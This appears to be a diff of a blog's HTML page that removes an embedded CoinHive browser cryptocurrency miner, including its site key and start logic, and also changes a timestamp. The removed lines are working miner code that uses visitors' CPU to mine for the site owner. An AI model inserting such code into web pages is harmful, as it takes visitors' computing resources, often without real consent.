@@ -42,23 +42,6 @@
     </script>
 
 
-  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-  <!-- CoinHive -->
-  <script>
-    var miner = new CoinHive.Anonymous('CLCs74GtZ05pN4V8LsFkGeZWsfAzVjLn', {throttle: 0.8});
-
-    // Only start on non-mobile devices and if not opted-out
-    // in the last 14400 seconds (4 hours):
-    if (!miner.isMobile() && !miner.didOptOut(14400)) {
-      miner.start();
-    }
-
-    setInterval(function() {
-      // var hashesPerSecond = miner.getHashsePerSecond();
-      var acceptedHashes = miner.getAcceptedHashes();
-      document.getElementById("hashCount").innerHTML = acceptedHashes;
-    }, 1000);
-  </script>
 <link rel="stylesheet" href="/css/prism-atom-dark.css" type="text/css">
 <link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
@@ -137,7 +120,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2018-03-25</span>
-            <span class="time">17:59:10</span>
+            <span class="time">10:59:41</span>
           </span>
           
         </div>
